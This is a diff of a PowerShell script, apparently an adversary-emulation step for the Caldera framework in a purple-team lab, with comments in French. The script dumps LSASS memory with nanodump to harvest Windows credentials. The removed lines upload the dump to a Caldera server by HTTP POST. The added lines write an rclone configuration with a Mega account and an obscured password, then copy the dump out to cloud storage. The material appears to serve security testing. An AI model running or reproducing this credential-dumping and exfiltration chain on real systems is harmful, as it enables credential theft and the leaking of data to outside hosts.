@@ -3,30 +3,27 @@ $dumpPath = "$env:TEMP\lsass.dmp"
 Start-Process -FilePath "$env:ProgramData\Microsoft\Windows\Caldera\nanodump\dist\nanodump.x64.exe" `
     -ArgumentList "--write $dumpPath --valid" -Wait
 
-# Exfiltrate via HTTP POST to Caldera
-if (Test-Path $dumpPath) {
-    $server = "http://192.168.244.128:8888/file/upload"
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $LF = "`r`n"
-    $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
 
-    $body = "--$boundary$LF"
-    $body += "Content-Disposition: form-data; name=`"data`"; filename=`"lsass.dmp`"$LF"
-    $body += "Content-Type: application/octet-stream$LF$LF"
-    $bodyBytes = [System.Text.Encoding]::ASCII.GetBytes($body)
+# Exfiltrate lsass.dmp via HTTP POST (multipart/form-data) to Caldera
 
-    $fileBytes = [System.IO.File]::ReadAllBytes($dumpPath)
-    $endBoundary = "$LF--$boundary--$LF"
-    $endBoundaryBytes = [System.Text.Encoding]::ASCII.GetBytes($endBoundary)
-
-    $fullBody = New-Object System.IO.MemoryStream
-    $fullBody.Write($bodyBytes, 0, $bodyBytes.Length)
-    $fullBody.Write($fileBytes, 0, $fileBytes.Length)
-    $fullBody.Write($endBoundaryBytes, 0, $endBoundaryBytes.Length)
-    $fullBody.Seek(0, "Begin") | Out-Null
-
-    Invoke-WebRequest -Uri $server -Method Post -Body $fullBody -Headers $headers
-}
+$ErrorActionPreference = 'Stop'
+# === CONFIGURATION DU RCLONE POUR MEGA ===
+# Créer le dossier de configuration rclone
+New-Item "$env:APPDATA\rclone" -ItemType Directory -Force | Out-Null
+# Écrire le fichier rclone.conf (personnalise avec ton propre compte + mot de passe obscurci)
+Set-Content "$env:APPDATA\rclone\rclone.conf" @"
+[myMegaRemote]
+type = mega
+user = purple.lab.local@gmail.com
+pass = Tf1CRTj6UL4Y449izAhIemgWwFEAdPW9SGXcVf_l
+"@
+# === FICHIER À EXFILTRER ===
+# Ici tu peux pointer vers lsass.dmp ou un fichier compressé par une autre TTP
+$dump = "$env:TEMP\lsass.dmp"
+# $dump = "#{host.dir.compress}"  # ← si tu veux l'utiliser dynamiquement via Caldera avec un fact injecté
+# === EXFILTRATION ===
+# Exfiltration vers Mega (répertoire "test")
+rclone --config "$env:APPDATA\rclone\rclone.conf" copy $dump myMegaRemote:test --max-size 1700k -v
 
 # Cleanup
 Start-Sleep -Seconds 5
